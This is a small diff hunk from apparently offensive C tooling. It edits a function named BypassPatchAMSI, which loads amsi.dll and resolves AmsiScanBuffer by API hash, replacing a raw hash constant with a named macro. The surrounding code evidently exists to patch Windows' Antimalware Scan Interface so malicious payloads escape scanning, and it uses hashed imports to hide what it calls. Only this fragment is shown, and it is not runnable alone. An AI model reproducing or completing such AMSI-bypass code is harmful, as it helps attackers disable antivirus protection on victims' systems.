@@ -752,7 +752,7 @@ BOOL BypassPatchAMSI(
 
     PRINTF( "[+] Loaded asmi.dll: %p\n", hModuleAmsi );
 
-    pAddress = LdrFunctionAddr( hModuleAmsi, 0x29fcd18e );
+    pAddress = LdrFunctionAddr( hModuleAmsi, H_FUNC_AMSISCANBUFFER );
     if( pAddress == NULL )
         return 0;
 
